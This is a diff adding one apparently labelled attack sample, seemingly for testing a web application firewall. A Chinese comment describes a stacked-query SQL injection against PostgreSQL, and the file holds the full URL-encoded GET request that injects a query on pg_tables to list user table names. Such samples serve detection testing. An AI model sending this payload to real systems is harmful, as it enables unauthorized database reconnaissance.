@@ -1,0 +1,9 @@
+# SQL注入_GET_postgresql _普通注入-06506345
+# 攻击者基于堆叠查询，将"select tablename from pg_tables where tablename not like 'pg%' and tablename not like 'sql_%' order by tablename"语句注入到 SQL 查询参数中，查询除开头为'pg%'和'sql_'的所有用户表表名信息。
+GET /?id=1%3Bselect%20tablename%20from%20pg_tables%20where%20tablename%20not%20like%20%27pg%25%27%20and%20tablename%20not%20like%20%27sql_%25%27%20order%20by%20tablename&bid=hd_tag_m8mv23z3 HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv23z3
+RM-PRO-Token: 5662118b5b19ac0f1d5a5d1ec35a73f6
+RM-PRO-Time: 1742808353695
+User-Agent: curl/7.83.1
+
